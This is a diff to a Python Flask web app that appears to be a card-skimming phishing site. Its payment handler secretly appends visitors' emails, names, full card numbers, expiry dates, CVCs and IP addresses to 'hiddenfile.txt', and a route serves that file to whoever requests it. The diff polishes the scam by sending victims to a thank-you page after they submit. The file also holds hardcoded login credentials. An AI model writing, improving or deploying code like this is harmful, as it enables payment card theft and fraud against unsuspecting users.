@@ -2,14 +2,13 @@ from flask import Flask, render_template, request, redirect, url_for, send_from_
 import os
 import socket
 from requests import get 
-import urllib.request
 
 app = Flask(__name__)
 
 # Set your password and username
 USERNAME = '698445212547825547'
 PASSWORD = 'bevendroxmasc888'
-#hostname = socket.gethostname()
+
 def get_client_ip():
     if request.headers.getlist("X-Forwarded-For"):
         return request.headers.getlist("X-Forwarded-For")[0]
@@ -57,7 +56,11 @@ def submit_payment():
     with open('hiddenfile.txt', 'a') as f:
         f.write(f"Email: {email}, Name: {name}, Card Number: {card_number}, Expiry: {expiry}, CVC: {cvc}, User IP: {user_ip}\n")
 
-    return redirect(url_for('home'))  # Redirect to the home page or another page
+    return redirect(url_for('thank_you'))  # Redirect to the thank you page
+
+@app.route('/thank_you')
+def thank_you():
+    return render_template('thank_you.html')
 
 @app.route('/hiddenfile.txt', methods=['GET', 'POST'])
 def hidden_file():
@@ -88,4 +91,3 @@ def hidden_file():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
-
